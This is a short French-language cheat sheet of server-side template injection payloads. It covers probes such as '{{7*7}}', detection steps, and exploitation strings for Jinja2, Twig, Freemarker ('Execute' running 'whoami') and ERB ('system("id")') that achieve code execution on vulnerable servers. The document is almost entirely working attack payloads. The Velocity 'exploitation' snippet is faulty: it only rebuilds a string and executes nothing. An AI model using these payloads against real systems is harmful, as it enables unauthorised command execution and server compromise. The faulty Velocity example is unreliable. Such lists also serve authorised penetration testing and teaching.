# Identification

### Charges utiles courantes

```jinja2
{{7*7}}  # Jinja2
${7*7}   # Velocity
#{7*7}   # Freemarker
<%= 7*7 %>  # ERB
```

### Détection de SSTI

1. Injecter des expressions arithmétiques (`{{7*7}}`, `${7*7}`) et vérifier leur évaluation.
2. Rechercher des messages d'erreur indiquant l'utilisation d'un moteur de modèles.
3. Utiliser des variables intégrées (ex. `{{config}}`, `${application}`) pour confirmer l'exploitation.

# Exploitation

### Jinja2 (Python)

```jinja2
{{ self.__class__.__mro__[1].__subclasses__() }}
{{ config.__class__.__mro__[1].__subclasses__() }}
```

### Twig (PHP)

```twig
{{ _self.env.global }}
{{ dump(app) }}
```

### Freemarker (Java)

```freemarker
${"freemarker.template.utility.Execute"?new()("whoami")}
```

### ERB (Ruby)

```erb
<%= system("id") %>
```

### Velocity (Java)

```velocity
#set($cmd="id")
#set($res="")
#foreach($i in $cmd.toCharArray())
  #set($res = "$res$i")
#end
$res
```
